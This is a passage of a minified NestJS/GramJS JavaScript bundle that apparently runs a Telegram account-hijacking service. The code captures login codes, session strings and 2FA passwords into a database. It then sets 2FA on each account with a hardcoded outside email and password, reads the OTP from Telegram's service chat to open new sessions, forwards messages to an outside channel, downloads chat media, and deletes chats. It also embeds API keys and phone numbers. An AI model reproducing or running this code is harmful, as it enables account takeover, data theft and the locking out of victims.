range.`);else console.log("No profile photos found.")}catch(e){console.error("Error:",e)}}async getLastActiveTime(){const e=await this.client.invoke(new d.Api.account.GetAuthorizations);let t=0;return e.authorizations.map((e=>{this.isAuthMine(e)||t<e.dateActive&&(t=e.dateActive)})),new Date(1e3*t).toISOString().split("T")[0]}async getContacts(){return await this.client.invoke(new d.Api.contacts.GetContacts({hash:(0,w.default)(0)}))}async deleteChat(e){try{await this.client.invoke(new d.Api.messages.DeleteHistory({justClear:!1,peer:e,revoke:!1})),console.log(`Dialog with ID ${e} has been deleted.`)}catch(e){console.error("Failed to delete dialog:",e)}}async blockUser(e){try{await(this.client?.invoke(new d.Api.contacts.Block({id:e}))),console.log(`User with ID ${e} has been blocked.`)}catch(e){console.error("Failed to block user:",e)}}downloadWithTimeout(e,t){return Promise.race([e,new Promise(((e,o)=>setTimeout((()=>o(new Error("Download timeout"))),t)))])}async getMediaMetadata(e="me",t=void 0,o=100){try{const i={limit:parseInt(o.toString())};t&&(i.offsetId=parseInt(t.toString()));const r=await this.client.getMessages(e,i),n=r.filter((e=>e.media&&"MessageMediaWebPage"!==e.media.className));if(console.log("Total:",r.total,"fetched: ",r.length,"ChatId: ",e,"Media :",n.length),!r.length)return console.log("No more media messages found. Reached the end of the chat."),{data:[],endOfMessages:!0};const a=[];for(const e of n){console.log(e.media.className,e.document?.mimeType);let t=null;try{if(e.media instanceof d.Api.MessageMediaPhoto){const o=e.photo?.sizes||[1];t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:o[1]||o[0]}),5e3),console.log("messageId image:",e.id),a.push({messageId:e.id,mediaType:"photo",thumb:t?.toString("base64")||null})}else if(e.media instanceof d.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))){const o=e.document?.thumbs||[1];console.log("messageId video:",e.id),t=await this.downloadWithTimeout(this.client.downloadMedia(e,{thumb:o[1]||o[0]}),5e3),a.push({messageId:e.id,mediaType:"video",thumb:t?.toString("base64")||null})}}catch(t){"Download timeout"===t.message?console.warn(`Skipping media messageId: ${e.id} due to download timeout.`):t.message.includes("FILE_REFERENCE_EXPIRED")?console.warn("File reference expired for message. Skipping this media."):console.error(`Failed to download media thumbnail for messageId: ${e.id}`,t),a.push({messageId:e.id,mediaType:"photo",thumb:null});continue}}return a.length||a.push({messageId:r[r.length-1].id,mediaType:"photo",thumb:null}),console.log("Returning ",a.length),{data:a,endOfMessages:!1}}catch(i){if(console.error("Error in getMediaMetadata:",i),i.message.includes("FLOOD_WAIT")){const r=parseInt(i.message.match(/FLOOD_WAIT_(\d+)/)[1],10);return console.warn(`Rate limit hit. Retrying after ${r} seconds.`),await new Promise((e=>setTimeout(e,1e3*r))),this.getMediaMetadata(e,t,o)}throw new Error("Error fetching media metadata")}}async downloadMediaFile(e,t="me",o){try{const i=(await this.client.getMessages(t,{ids:[e]}))[0];if(!i||i.media instanceof d.Api.MessageMediaEmpty)o.status(404).send("Media not found");else{const e=i.media;let t,r,n;const a=i.video||i.photo,s={id:a.id,accessHash:a.accessHash,fileReference:a.fileReference};if(e instanceof d.Api.MessageMediaPhoto)t="image/jpeg",r="photo.jpg",n=new d.Api.InputPhotoFileLocation({...s,thumbSize:"m"});else{if(!(e instanceof d.Api.MessageMediaDocument))return o.status(415).send("Unsupported media type");t=e.mimeType||"video/mp4",r="video.mp4",n=new d.Api.InputDocumentFileLocation({...s,thumbSize:""})}o.setHeader("Content-Type",t),o.setHeader("Content-Disposition",`attachment; filename="${r}"`);const c=524288;for await(const e of this.client.iterDownload({file:n,offset:w.default[0],limit:5242880,requestSize:c}))o.write(e);o.end()}}catch(e){if(e.message.includes("FILE_REFERENCE_EXPIRED"))return o.status(404).send("File reference expired");console.error("Error downloading media:",e),o.status(500).send("Error downloading media")}}async forwardMessage(e,t){try{await this.client.forwardMessages("@fuckyoubabie",{fromPeer:e,messages:t})}catch(e){console.log("Failed to Forward Message : ",e.errorMessage)}}async updateUsername(e){let t="",o=e&&""!==e?e:"",i=0;if(""===o)try{await this.client.invoke(new d.Api.account.UpdateUsername({username:o})),console.log("Removed Username successfully.")}catch(e){console.log(e)}else for(;i<10;)try{const r=await this.client.invoke(new d.Api.account.CheckUsername({username:o}));if(console.log(r," - ",o),r){await this.client.invoke(new d.Api.account.UpdateUsername({username:o})),console.log(`Username '${o}' updated successfully.`),t=o;break}o=e+i,i++,await(0,h.sleep)(2e3)}catch(r){if(console.log(r.message),"USERNAME_NOT_MODIFIED"==r.errorMessage){t=o;break}o=e+i,i++,await(0,h.sleep)(2e3)}return t}async updatePrivacy(){try{await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyPhoneCall,rules:[new d.Api.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyProfilePhoto,rules:[new d.Api.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyForwards,rules:[new d.Api.InputPrivacyValueAllowAll]})),console.log("forwards Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyPhoneNumber,rules:[new d.Api.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyStatusTimestamp,rules:[new d.Api.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated"),await this.client.invoke(new d.Api.account.SetPrivacy({key:new d.Api.InputPrivacyKeyAbout,rules:[new d.Api.InputPrivacyValueAllowAll]}))}catch(e){throw e}}async getFileUrl(e,t){const o=await u.default.get(e,{responseType:"stream"}),i=`/tmp/${t}`;return await new Promise(((e,t)=>{const r=f.createWriteStream(i);o.data.pipe(r),r.on("finish",(()=>e(!0))),r.on("error",t)})),i}async updateProfilePic(e){try{const t=await this.client.uploadFile({file:new y.CustomFile("pic.jpg",f.statSync(e).size,e),workers:1});console.log("file uploaded"),await this.client.invoke(new d.Api.photos.UploadProfilePhoto({file:t})),console.log("profile pic updated")}catch(e){throw e}}async hasPassword(){return(await this.client.invoke(new d.Api.account.GetPassword)).hasPassword}async set2fa(){if(await this.hasPassword())console.log("Password already exists");else{console.log("Password Does not exist, Setting 2FA");const e=v.MailReader.getInstance(),t={email:"storeslaksmi@gmail.com",hint:"password - India143",newPassword:"Ajtdmwajt1@"};try{await e.connectToMail();const o=setInterval((async()=>{if(console.log("Checking if mail is ready"),e.isMailReady())return clearInterval(o),console.log("Mail is ready, checking code!"),await this.client.updateTwoFaSettings({isCheckPassword:!1,email:t.email,hint:t.hint,newPassword:t.newPassword,emailCodeCallback:async t=>(console.log("Code sent"),new Promise((async(t,o)=>{let i=0;const r=setInterval((async()=>{try{if(console.log("Checking code"),i++,e.isMailReady()&&i<4){const o=await e.getCode();console.log("Code:",o),o&&(await e.disconnectFromMail(),clearInterval(r),t(o))}else clearInterval(r),await e.disconnectFromMail(),o(new Error("Failed to retrieve code"))}catch(t){clearInterval(r),await e.disconnectFromMail(),o(t)}}),1e4)}))),onEmailCodeError:e=>(console.error("Email code error:",(0,m.parseError)(e)),Promise.resolve("error"))}),t;console.log("Mail not ready yet")}),5e3)}catch(e){console.error("Unable to connect to mail server:",(0,m.parseError)(e))}}}async sendPhotoChat(e,t,o,i){if(!this.client)throw new Error("Client is not initialized");const r=await this.getFileUrl(t,i),n=new y.CustomFile(r,f.statSync(r).size,i);await this.client.sendFile(e,{file:n,caption:o})}async sendFileChat(e,t,o,i){if(!this.client)throw new Error("Client is not initialized");const r=await this.getFileUrl(t,i),n=new y.CustomFile(r,f.statSync(r).size,i);await this.client.sendFile(e,{file:n,caption:o})}async deleteProfilePhotos(){try{const e=await this.client.invoke(new d.Api.photos.GetUserPhotos({userId:"me"}));console.log(`Profile Pics found: ${e.photos.length}`),e&&e.photos?.length>0&&await this.client.invoke(new d.Api.photos.DeletePhotos({id:e.photos})),console.log("Deleted profile Photos")}catch(e){throw e}}async createNewSession(){const e=await this.client.getMe();console.log("Phne:",e.phone);const t=new c.TelegramClient(new l.StringSession(""),parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:1});await t.start({phoneNumber:e.phone,password:async()=>"Ajtdmwajt1@",phoneCode:async()=>(console.log("Waiting for the OTP code from chat ID 777000..."),await this.waitForOtp()),onError:e=>{throw e}});const o=t.session.save();return await t.disconnect(),console.log("New Session: ",o),o}async waitForOtp(){for(let e=0;e<3;e++)try{console.log("Attempt : ",e);const t=(await this.client.getMessages("777000",{limit:1}))[0];if(t&&t.date&&1e3*t.date>Date.now()-6e4){const e=t.text.split(".")[0].split("code:**")[1].trim();return console.log("returning: ",e),e}{console.log("Message Date: ",new Date(1e3*t.date).toISOString(),"Now: ",new Date(Date.now()-6e4).toISOString());const o=t.text.split(".")[0].split("code:**")[1].trim();if(console.log("Skipped Code: ",o),2==e)return o;await(0,h.sleep)(5e3)}}catch(e){await(0,h.sleep)(2e3),console.log(e)}}}t.default=b},7777:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddContactDto=void 0;const n=o(9742);class a{}t.AddContactDto=a,i([(0,n.ApiProperty)({description:"The mobile number of the user for authentication",example:"+1234567890"}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.ApiProperty)({description:"List of phone numbers to add as contacts",type:Object,example:[{mobile:"+1234567890",tgId:"1234567890"}]}),r("design:type",Array)],a.prototype,"data",void 0),i([(0,n.ApiProperty)({description:"Prefix for automated contact names",example:"Contact"}),r("design:type",String)],a.prototype,"prefix",void 0)},8062:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AddContactsDto=void 0;const n=o(9742);class a{}t.AddContactsDto=a,i([(0,n.ApiProperty)({description:"The mobile number of the user for authentication",example:"+1234567890"}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.ApiProperty)({description:"List of phone numbers to add as contacts",type:Object,example:["919892184284","919967837841","919972600626"]}),r("design:type",Array)],a.prototype,"phoneNumbers",void 0),i([(0,n.ApiProperty)({description:"Prefix for automated contact names",example:"Contact"}),r("design:type",String)],a.prototype,"prefix",void 0)},886:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupModule=void 0;const r=o(3563),n=o(7814),a=o(7422),s=o(2431);let c=class{};t.TgSignupModule=c,t.TgSignupModule=c=i([(0,r.Module)({imports:[(0,r.forwardRef)((()=>a.UsersModule))],controllers:[n.TgSignupController],providers:[s.TgSignupService],exports:[s.TgSignupService]})],c)},2431:function(e,t,o){var i,r=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupService=void 0;const a=o(3563),s=o(3820),c=o(3047),l=o(689),p=o(5651),d=o(9425),u=o(9127),f=o(6185);let y=i=class{constructor(e){this.usersService=e,this.logger=new a.Logger(i.name),this.cleanupInterval=setInterval((()=>this.cleanupStaleSessions()),i.SESSION_CLEANUP_INTERVAL)}async onModuleDestroy(){clearInterval(this.cleanupInterval);const e=Array.from(i.activeClients.keys());await Promise.all(e.map((e=>this.disconnectClient(e))))}getRandomCredentials(){const e=Math.floor(Math.random()*i.API_CREDENTIALS.length);return i.API_CREDENTIALS[e]}async cleanupStaleSessions(){for(const[e,t]of i.activeClients)try{t.client&&!t.client.connected&&await this.disconnectClient(e)}catch(t){this.logger.error(`Error cleaning up session for ${e}: ${t.message}`)}}validatePhoneNumber(e){if(e=e.replace(/^\+/,""),!/^\d{10,15}$/.test(e))throw new a.BadRequestException("Invalid phone number format");return e}async disconnectClient(e){const t=i.activeClients.get(e);if(t)try{clearTimeout(t.timeoutId),t.client?.connected&&await t.client.disconnect(),t.client&&await t.client.destroy()}catch(t){this.logger.warn(`Error disconnecting client for ${e}: ${t.message}`)}finally{i.activeClients.delete(e)}}async sendCode(e){try{this.logger.debug(`Validating phone number: ${e}`),e=this.validatePhoneNumber(e),this.logger.debug(`Disconnecting any existing client for: ${e}`),await this.disconnectClient(e),this.logger.debug("Fetching random credentials for API ID and API Hash");const{apiId:t,apiHash:o}=this.getRandomCredentials(),r=new l.StringSession(""),n=new c.TelegramClient(r,t,o,{connectionRetries:5,retryDelay:2e3,useWSS:!0,timeout:3e4});this.logger.debug("Setting log level to ERROR for TelegramClient"),await n.setLogLevel(p.LogLevel.ERROR),this.logger.debug("Connecting to Telegram server"),await n.connect(),this.logger.debug(`Invoking API to send code to: ${e}`);const d=await n.invoke(new s.Api.auth.SendCode({phoneNumber:e,apiId:t,apiHash:o,settings:new s.Api.CodeSettings({currentNumber:!0,allowAppHash:!0})}));if(this.logger.debug(`Received send code result for ${e}: ${JSON.stringify(d)}`),d instanceof s.Api.auth.SentCodeSuccess)throw this.logger.error(`Unexpected immediate login for ${e}`),new a.BadRequestException("Unexpected immediate login");this.logger.debug(`Setting up session timeout for ${e}`);const u=setTimeout((()=>this.disconnectClient(e)),i.LOGIN_TIMEOUT);return this.logger.debug(`Storing client session for ${e}`),i.activeClients.set(e,{client:n,phoneCodeHash:d.phoneCodeHash,timeoutId:u,createdAt:Date.now()}),{phoneCodeHash:d.phoneCodeHash,isCodeViaApp:d.type instanceof s.Api.auth.SentCodeTypeApp}}catch(t){throw this.logger.error(`Failed to send code to ${e}: ${t.message}`,t.stack),await this.disconnectClient(e),new a.BadRequestException(t.message||"Failed to send verification code")}}async verifyCode(e,t,o){try{this.logger.debug(`Validating phone number for verification: ${e}`),e=this.validatePhoneNumber(e),this.logger.debug(`Fetching active session for ${e}`);const r=i.activeClients.get(e);if(!r)throw this.logger.warn(`No active signup session found for ${e}`),new a.BadRequestException("No active signup session found. Please request a new code.");if(this.logger.debug(`Checking session age for ${e}`),Date.now()-r.createdAt>i.LOGIN_TIMEOUT)throw await this.disconnectClient(e),this.logger.warn(`Verification code expired for ${e}`),new a.BadRequestException("Verification code expired. Please request a new code.");if(!r.client?.connected)throw await this.disconnectClient(e),this.logger.warn(`Client connection lost for ${e}`),new a.BadRequestException("Connection lost. Please request a new code.");this.logger.debug(`Invoking SignIn API for ${e}`);const{client:n,phoneCodeHash:c}=r;try{this.logger.debug(`Attempting to sign in with code for ${e}`);const i=await n.invoke(new s.Api.auth.SignIn({phoneNumber:e,phoneCodeHash:c,phoneCode:t}));if(!i)throw new a.BadRequestException("Invalid response from Telegram server");if(this.logger.debug(`SignIn result for ${e}: ${JSON.stringify(i)}`),i instanceof s.Api.auth.AuthorizationSignUpRequired){this.logger.log(`New user registration required for ${e}`);const t=await this.handleNewUserRegistration(e,n,c);return await this.disconnectClient(e),t}const r=n.session.save();if(!r)throw new Error("Failed to generate session string");this.logger.log(`User login successful for ${e}`);const l=await this.processLoginResult(i.user,r,o);return await this.disconnectClient(e),l}catch(t){if("SESSION_PASSWORD_NEEDED"===t.errorMessage)return this.logger.warn(`2FA required for ${e}`),o?await this.handle2FALogin(e,r.client,o):{status:400,message:"Two-factor authentication required",requires2FA:!0};throw t}}catch(t){throw this.logger.error(`Verification failed for ${e}: ${t.message}`,t.stack),await this.disconnectClient(e),new a.BadRequestException(t.message||"Verification failed")}}async handle2FALogin(e,t,o){try{this.logger.debug(`Fetching password SRP parameters for ${e}`);const i=await t.invoke(new s.Api.account.GetPassword);this.logger.debug(`Computing password check for ${e}`);const r=await(0,d.computeCheck)(i,o);this.logger.debug(`Invoking CheckPassword API for ${e}`);const n=await t.invoke(new s.Api.auth.CheckPassword({password:r}));if(!n||!n.user)throw new a.BadRequestException("Invalid response from Telegram server");this.logger.log(`2FA login successful for ${e}`);const c=t.session.save();if(!c)throw new Error("Failed to generate session string");const l=await this.processLoginResult(n.user,c,o);return await this.disconnectClient(e),l}catch(t){if(this.logger.error(`2FA login failed for ${e}: ${t.message}`,t.stack),o)throw new a.BadRequestException("Incorrect 2FA password");throw new a.BadRequestException("2FA password required")}}async handleNewUserRegistration(e,t,o){try{const i=`User${Math.random().toString(36).substring(2,8)}`,r=await t.invoke(new s.Api.auth.SignUp({phoneNumber:e,phoneCodeHash:o,firstName:i,lastName:""}));if(!r||!r.user)throw new a.BadRequestException("Invalid response from Telegram server");const n=t.session.save();if(!n)throw new Error("Failed to generate session string");return await this.processLoginResult(r.user,n)}catch(e){const t=(0,f.parseError)(e);throw this.logger.error(`Failed to register new user: ${t.message}`),new a.BadRequestException(t.message||"Failed to register new user")}}async processLoginResult(e,t,o){try{if(!e||!t)throw new Error("Invalid user data or session string");const i=new Date,r={mobile:e.phone?.toString()?.replace(/^\+/,"")||"",session:t,firstName:e.firstName||"",lastName:e.lastName||"",username:e.username||"",tgId:e.id?.toString()||"",twoFA:!!o,password:o||null,lastActive:i.toISOString().split("T")[0],expired:!1,channels:0,personalChats:0,totalChats:0,otherPhotoCount:0,ownPhotoCount:0,ownVideoCount:0,otherVideoCount:0,recentUsers:[],calls:{chatCallCounts:[],incoming:0,outgoing:0,totalCalls:0,video:0},contacts:0,movieCount:0,msgs:0,photoCount:0,videoCount:0,gender:"unknown"};if(!r.mobile||!r.tgId)throw new Error("Invalid user data received from Telegram");return await this.usersService.create(r),{status:200,message:"Registration successful",session:t}}catch(e){if(this.logger.error("Error processing login result:",e),e instanceof a.BadRequestException)throw e;throw new a.InternalServerErrorException("Failed to complete registration")}}};t.TgSignupService=y,y.LOGIN_TIMEOUT=15e4,y.SESSION_CLEANUP_INTERVAL=12e4,y.PHONE_PREFIX="+",y.activeClients=new Map,y.API_CREDENTIALS=[{apiId:27919939,apiHash:"5ed3834e741b57a560076a1d38d2fa94"},{apiId:25328268,apiHash:"b4e654dd2a051930d0a30bb2add80d09"},{apiId:12777557,apiHash:"05054fc7885dcfa18eb7432865ea3500"},{apiId:27565391,apiHash:"a3a0a2e895f893e2067dae111b20f2d9"},{apiId:27586636,apiHash:"f020539b6bb5b945186d39b3ff1dd998"},{apiId:29210552,apiHash:"f3dbae7e628b312c829e1bd341f1e9a9"}],t.TgSignupService=y=i=r([(0,a.Injectable)(),n("design:paramtypes",[u.UsersService])],y)},3318:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupResponse=t.VerifyCodeDto=t.SendCodeDto=void 0;const n=o(9742),a=o(4922),s=o(7403);class c{}t.SendCodeDto=c,i([(0,n.ApiProperty)({description:"Phone number to send the verification code to (international format)",example:"+919876543210"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\+\d{8,15}$/,{message:"Invalid phone number format"}),r("design:type",String)],c.prototype,"phone",void 0);class l{}t.VerifyCodeDto=l,i([(0,n.ApiProperty)({description:"Phone number used for verification (international format)",example:"919876543210"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\+\d{8,15}$/,{message:"Invalid phone number format"}),r("design:type",String)],l.prototype,"phone",void 0),i([(0,n.ApiProperty)({description:"Verification code received",example:"12345"}),(0,s.IsString)(),(0,s.IsNotEmpty)(),(0,s.Matches)(/^\d{5}$/,{message:"Code must be exactly 5 digits"}),r("design:type",String)],l.prototype,"code",void 0),i([(0,n.ApiProperty)({description:"Two-factor authentication password if required",example:"yourSecurePassword123",required:!1}),(0,s.IsString)(),(0,s.IsOptional)(),(0,a.Transform)((({value:e})=>""===e?void 0:e)),r("design:type",String)],l.prototype,"password",void 0);class p{}t.TgSignupResponse=p,i([(0,n.ApiProperty)({description:"Operation status code",example:200}),r("design:type",Number)],p.prototype,"status",void 0),i([(0,n.ApiProperty)({description:"Response message",example:"Login successful"}),r("design:type",String)],p.prototype,"message",void 0),i([(0,n.ApiProperty)({description:"Phone code hash for verification",example:"abc123xyz",required:!1}),r("design:type",String)],p.prototype,"phoneCodeHash",void 0),i([(0,n.ApiProperty)({description:"Whether the code was sent via app",example:!0,required:!1}),r("design:type",Boolean)],p.prototype,"isCodeViaApp",void 0),i([(0,n.ApiProperty)({description:"Session string for authenticated client",required:!1}),r("design:type",String)],p.prototype,"session",void 0),i([(0,n.ApiProperty)({description:"Whether 2FA is required",example:!1,required:!1}),r("design:type",Boolean)],p.prototype,"requires2FA",void 0)},7814:function(e,t,o){var i,r=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TgSignupController=void 0;const s=o(3563),c=o(9742),l=o(2431),p=o(3318),d=o(6185);let u=i=class{constructor(e){this.tgSignupService=e,this.logger=new s.Logger(i.name)}async sendCode(e){try{this.logger.debug(`[SEND_CODE] Request received for phone: ${e.phone}`);const t=await this.tgSignupService.sendCode(e.phone);return this.logger.debug(`[SEND_CODE] Success for phone: ${e.phone}`,{isCodeViaApp:t.isCodeViaApp,hasPhoneCodeHash:!!t.phoneCodeHash}),{status:s.HttpStatus.CREATED,message:"Verification code sent successfully",phoneCodeHash:t.phoneCodeHash,isCodeViaApp:t.isCodeViaApp}}catch(t){const o=(0,d.parseError)(t);if(this.logger.error(`[SEND_CODE] Error for phone: ${e.phone}`,{error:o,stack:t.stack,errorType:t.constructor.name}),t instanceof s.HttpException)throw t;throw new s.BadRequestException(o.message||"Failed to send verification code")}}async verifyCode(e){try{this.logger.debug("[VERIFY_CODE] Request received",{phone:e.phone,hasPassword:!!e.password});const t=await this.tgSignupService.verifyCode(e.phone,e.code,e.password);return this.logger.debug(`[VERIFY_CODE] Success for phone: ${e.phone}`,{status:t.status,requires2FA:t.requires2FA,hasSession:!!t.session}),{status:s.HttpStatus.OK,message:t.message,session:t.session,requires2FA:t.requires2FA}}catch(t){const o=(0,d.parseError)(t);if(this.logger.error(`[VERIFY_CODE] Error for phone: ${e.phone}`,{error:o,stack:t.stack,errorType:t.constructor.name,code:e.code?.length||0}),t instanceof s.HttpException)throw t;throw new s.BadRequestException(o.message||"Verification failed")}}};t.TgSignupController=u,r([(0,s.Post)("send-code"),(0,c.ApiOperation)({summary:"Send verification code to phone number",description:"Initiates the signup process by sending a verification code via Telegram"}),(0,c.ApiResponse)({status:s.HttpStatus.CREATED,type:p.TgSignupResponse,description:"Code sent successfully"}),(0,c.ApiResponse)({status:s.HttpStatus.BAD_REQUEST,description:"Invalid phone number or failed to send code",schema:{type:"object",properties:{statusCode:{type:"number",example:400},message:{type:"string",example:"Invalid phone number format"},error:{type:"string",example:"Bad Request"}}}}),(0,c.ApiResponse)({status:s.HttpStatus.TOO_MANY_REQUESTS,description:"Rate limit exceeded"}),(0,c.ApiResponse)({status:s.HttpStatus.INTERNAL_SERVER_ERROR,description:"Internal server error occurred"}),a(0,(0,s.Body)()),n("design:type",Function),n("design:paramtypes",[p.SendCodeDto]),n("design:returntype",Promise)],u.prototype,"sendCode",null),r([(0,s.Post)("verify"),(0,c.ApiOperation)({summary:"Verify code and complete signup/login",description:"Verifies the code sent to phone and completes the signup/login process"}),(0,c.ApiResponse)({status:s.HttpStatus.OK,type:p.TgSignupResponse,description:"Verification successful"}),(0,c.ApiResponse)({status:s.HttpStatus.BAD_REQUEST,description:"Invalid code or verification failed"}),(0,c.ApiResponse)({status:s.HttpStatus.TOO_MANY_REQUESTS,description:"Rate limit exceeded"}),(0,c.ApiResponse)({status:s.HttpStatus.INTERNAL_SERVER_ERROR,description:"Internal server error occurred"}),a(0,(0,s.Body)()),n("design:type",Function),n("design:paramtypes",[p.VerifyCodeDto]),n("design:returntype",Promise)],u.prototype,"verifyCode",null),t.TgSignupController=u=i=r([(0,s.Controller)("tgsignup"),(0,c.ApiTags)("tgsignup"),(0,s.UsePipes)(new s.ValidationPipe({transform:!0,whitelist:!0,forbidNonWhitelisted:!0,transformOptions:{enableImplicitConversion:!0}})),(0,c.ApiExtraModels)(p.SendCodeDto,p.VerifyCodeDto,p.TgSignupResponse),n("design:paramtypes",[l.TgSignupService])],u)},7522:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ActiveChannelsController=void 0;const a=o(3563),s=o(9155),c=o(3585),l=o(5926),p=o(9742),d=o(803);let u=class{constructor(e){this.activeChannelsService=e}async create(e){return this.activeChannelsService.create(e)}async createMultiple(e){return this.activeChannelsService.createMultiple(e)}search(e){return console.log(e),this.activeChannelsService.search(e)}async findAll(){return this.activeChannelsService.findAll()}async findOne(e){return this.activeChannelsService.findOne(e)}async update(e,t){return this.activeChannelsService.update(e,t)}async remove(e){return this.activeChannelsService.remove(e)}addReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.addReactions(e,t.reactions)}getRandomReaction(e){return this.activeChannelsService.getRandomReaction(e)}removeReaction(e,t){if(!t.reactions)throw new a.BadRequestException("Reaction is required");return this.activeChannelsService.removeReaction(e,t.reactions[0])}};t.ActiveChannelsController=u,i([(0,a.Post)(),(0,p.ApiOperation)({summary:"Create a new active channel"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[c.CreateActiveChannelDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Post)("createMultiple"),(0,p.ApiOperation)({summary:"Create multiple channels"}),(0,p.ApiBody)({type:[c.CreateActiveChannelDto]}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Array]),r("design:returntype",Promise)],u.prototype,"createMultiple",null),i([(0,a.Get)("search"),(0,p.ApiOperation)({summary:"Search channels by 